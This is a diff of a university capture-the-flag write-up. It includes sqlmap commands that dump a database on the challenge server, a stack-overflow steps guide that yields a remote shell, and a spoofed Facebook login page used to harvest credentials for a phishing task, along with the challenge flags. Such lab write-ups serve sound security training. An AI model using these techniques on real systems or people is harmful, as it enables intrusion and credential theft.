@@ -1,3 +1,29 @@
+## mal
+
+## Task
+
+----------------------------------------------------------
+
+**Points**: 120
+
+**The Flag**: UiO-Hacking-Arena{C0ld_war_1s_0v4r}
+
+**The Task**: Find the flag here: kenobi.hackingarena.com, port range: 3000-3500
+
+
+
+**Solution**:
+
+
+**Pictures**:
+
+
+# Osint
+
+
+# Technical information gathering
+
+
 # Networking 
 
 ## Bluebox
@@ -245,9 +271,9 @@ Note: this task was hell!
 **Solution**:
 * I solved it with sqlmap.
 
-sudo sqlmap -u http://kenobi.hackingarena.com:912/index.php --form --dbs --level 4 --risk 3 --threads 10 --dbms=mysql
-sudo sqlmap -u http://kenobi.hackingarena.com:912/index.php --form -D BeatlesData --tables --level 3 --risk 3 --threads 10 --dbms=mysql
-sudo sqlmap -u http://kenobi.hackingarena.com:912/index.php --form -D BeatlesData -T SuperSecretFlag --dump --level 3 --risk 3 --threads 10 --dbms=mysql
+        sudo sqlmap -u http://kenobi.hackingarena.com:912/index.php --form --dbs --level 4 --risk 3 --threads 10 --dbms=mysql
+        sudo sqlmap -u http://kenobi.hackingarena.com:912/index.php --form -D BeatlesData --tables --level 3 --risk 3 --threads 10 --dbms=mysql
+        sudo sqlmap -u http://kenobi.hackingarena.com:912/index.php --form -D BeatlesData -T SuperSecretFlag --dump --level 3 --risk 3 --threads 10 --dbms=mysql
 
 
 **Pictures**
@@ -269,3 +295,96 @@ sudo sqlmap -u http://kenobi.hackingarena.com:912/index.php --form -D BeatlesDat
 
 
 
+## Task
+
+----------------------------------------------------------
+
+**Points**: 120
+
+**The Flag**: UiO-Hacking-Arena{C0ld_war_1s_0v4r}
+
+**The Task**: Find the flag here: kenobi.hackingarena.com, port range: 3000-3500
+
+
+# Pwn
+
+## Feedback padding length
+
+----------------------------------------------------------
+
+**Points**: 50
+
+**Padding length**: 120
+
+**The Task**: What is the necessary length of the paddingfor exploitation of the attached binary?
+
+**Solution**:
+
+ 1. First i examined what input is vulnerable, and found out that the comment can overflow the stack and crush the program.
+ 2. Then i started putting the input using pwn tools with the python expoit template.
+ 3. After experimenting with the values i could determine what is the length of the string that will overflow the stack, and that is the padding length.
+
+
+**Pictures**:
+
+[![Image from Gyazo](https://i.gyazo.com/2f93a30fa293be4a3f78cb37382b74be.png)](https://gyazo.com/2f93a30fa293be4a3f78cb37382b74be)
+[![Image from Gyazo](https://i.gyazo.com/bef3ad1dc80f24fb5c9534c61d55b057.png)](https://gyazo.com/bef3ad1dc80f24fb5c9534c61d55b057)
+
+
+
+## Feedback
+
+----------------------------------------------------------
+
+**Points**: 100
+
+**The Flag**: Hacking-Arena{H4lp_w1th_f1xing_it}
+
+**The Task**: Exploit the binary and read the remote flag: nc kenobi.hackingarena.com 921
+
+**Solution**:
+
+1. First i used the padding length that i found on the previous task.
+2. Then i found the esp jmp address, so the next instruction will be the esp register.
+
+        gdb ./feedback
+        start
+        asmsearch 'jmp esp' #and copied the address of the jmp
+
+
+3. Then i used the payload provided in the task while adding nopsledg 'x09' in the beginning of the payload, and after running the exploit i got the shell of my pc.
+4. Afterwards i used the exploit on the remote service, i got the remote shell and printed the flag.
+
+
+**Pictures**:
+[![Image from Gyazo](https://i.gyazo.com/882a92e3a32ce7546d4c60bd17826ed4.png)](https://gyazo.com/882a92e3a32ce7546d4c60bd17826ed4)
+
+[![Image from Gyazo](https://i.gyazo.com/6072433b4864f790bc493f800de1bc06.png)](https://gyazo.com/6072433b4864f790bc493f800de1bc06)
+
+[![Image from Gyazo](https://i.gyazo.com/46eb3de6963f49a63ca6f05734bf11b5.png)](https://gyazo.com/46eb3de6963f49a63ca6f05734bf11b5)
+
+# Social engineering
+
+## Spear phishing email
+
+----------------------------------------------------------
+
+**Points**: 100
+
+**The Flag**: Hacking-Arena{I'm_naive_ok_very_naive}
+
+**The Task**: Send me a spare-phishing email (laszlo.t.erdodi@gmail.com)
+
+
+**Solution**:
+
+1. First i made a spoofed facebook site on a server, with a php code that will store the username and password.
+2. The username and password that will be entered will be saved locally on the server machine.
+3. Then i made a phishing email where i mimicked a facebook warning.
+4. The day after i got the flag on my server.
+
+**Pictures**:
+
+[![Image from Gyazo](https://i.gyazo.com/83a3ce205fcd78b562a4f0d73f4633ca.png)](https://gyazo.com/83a3ce205fcd78b562a4f0d73f4633ca)
+
+[![Image from Gyazo](https://i.gyazo.com/88309f23b53f9bbc9c9a901070f7c290.png)](https://gyazo.com/88309f23b53f9bbc9c9a901070f7c290)
